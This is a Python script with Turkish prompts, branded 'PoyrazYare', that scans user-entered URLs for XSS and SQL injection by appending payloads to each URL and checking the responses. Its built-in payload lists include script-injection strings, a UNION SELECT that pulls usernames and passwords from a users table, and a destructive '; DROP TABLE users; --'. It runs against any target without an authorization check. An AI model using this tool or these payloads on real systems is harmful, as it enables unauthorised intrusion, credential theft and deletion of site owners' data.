import requests
import time

def scan_for_xss(url, payloads):
    found_xss = []
    print(f"\n{url} için PoyrazYare XSS Açıkları taranıyor...")
    
    for payload in payloads:
        try:
            response = requests.get(url + payload)
            if payload in response.text:
                print(f"PoyrazYare XSS Açığı Bulundu! Payload: {payload}")
                found_xss.append(payload)
        except requests.exceptions.RequestException as e:
            print(f"Hata: {e}")

    if not found_xss:
        print("PoyrazYare XSS açığı bulunamadı.")
    
    return found_xss

def scan_for_sql_injection(url, payloads):
    found_sql_injection = []
    print(f"\n{url} için PoyrazYare SQL Enjeksiyon Açıkları taranıyor...")
    
    for payload in payloads:
        try:
            response = requests.get(url + payload)
            if "error" in response.text.lower() or "mysql" in response.text.lower():
                print(f"PoyrazYare SQL Enjeksiyon Açığı Bulundu! Payload: {payload}")
                found_sql_injection.append(payload)
        except requests.exceptions.RequestException as e:
            print(f"Hata: {e}")

    if not found_sql_injection:
        print("PoyrazYare SQL enjeksiyon açığı bulunamadı.")
    
    return found_sql_injection

def save_results(results, url):
    with open("vulnerability_results.txt", "a") as f:
        f.write(f"PoyrazYare Taramanın yapıldığı URL: {url}\n")
        f.write("PoyrazYare XSS Açıkları:\n")
        if results['xss']:
            for payload in results['xss']:
                f.write(f"- {payload}\n")
        else:
            f.write("Hiçbir PoyrazYare XSS açığı bulunamadı.\n")
        
        f.write("PoyrazYare SQL Enjeksiyon Açıkları:\n")
        if results['sql']:
            for payload in results['sql']:
                f.write(f"- {payload}\n")
        else:
            f.write("Hiçbir PoyrazYare SQL enjeksiyon açığı bulunamadı.\n")
        
        f.write("\n" + "="*50 + "\n")  # Ayırıcı

    print("Sonuçlar 'vulnerability_results.txt' dosyasına kaydedildi.")

def main():
    urls = input("PoyrazYare ile taramak istediğiniz URL'leri girin (virgülle ayırarak): ").split(',')
    urls = [url.strip() for url in urls]
    
    default_xss_payloads = [
        "<script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>"
    ]

    default_sql_payloads = [
        "' OR '1'='1' --",
        "' OR '1'='2' --",
        "admin' --",
        "' UNION SELECT NULL, username, password FROM users --",
        "'; DROP TABLE users; --"
    ]
    
    custom_xss_payloads = input("PoyrazYare özel XSS payload'ları eklemek ister misiniz? (Evet/Hayır): ").strip().lower()
    if custom_xss_payloads == "evet":
        additional_payloads = input("XSS payload'larını virgülle ayırarak girin: ").split(',')
        additional_payloads = [payload.strip() for payload in additional_payloads]
        default_xss_payloads.extend(additional_payloads)

    custom_sql_payloads = input("PoyrazYare özel SQL enjeksiyonu payload'ları eklemek ister misiniz? (Evet/Hayır): ").strip().lower()
    if custom_sql_payloads == "evet":
        additional_sql_payloads = input("SQL enjeksiyon payload'larını virgülle ayırarak girin: ").split(',')
        additional_sql_payloads = [payload.strip() for payload in additional_sql_payloads]
        default_sql_payloads.extend(additional_sql_payloads)

    for url in urls:
        start_time = time.time()
        xss_results = scan_for_xss(url, default_xss_payloads)
        sql_results = scan_for_sql_injection(url, default_sql_payloads)
        save_results({'xss': xss_results, 'sql': sql_results}, url)
        elapsed_time = time.time() - start_time
        print(f"\n{url} için PoyrazYare tarama süresi: {elapsed_time:.2f} saniye")

if __name__ == "__main__":
    main()